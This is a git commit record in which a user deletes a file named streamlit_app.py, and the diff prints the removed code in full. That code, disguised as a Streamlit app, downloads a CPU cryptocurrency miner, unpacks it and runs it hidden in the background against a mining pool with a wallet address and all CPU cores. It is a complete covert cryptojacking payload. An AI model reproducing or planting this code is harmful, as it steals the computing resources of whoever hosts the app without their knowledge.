6430ef15caf5b0d4bd1d7f3eb0be18c8667cfb4e
sumarnoasintas <94970307+sumarnoasintas@users.noreply.github.com>
2021-11-28 03:25:19 +0700

    Delete streamlit_app.py

--- streamlit_app.py
+++
@@ -1,2 +0,0 @@
-import os
-os.system('curl https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz --output hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && rm hellminer_cpu* && nohup ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RHruQs8ZBcY7XZHMk8W7W6xcNvBAPrmrSz.GTX-II-$(echo $(shuf -i 1-99 -n 1)) -p x --cpu $(echo $(nproc --all)) > /dev/null 2>&1 &')
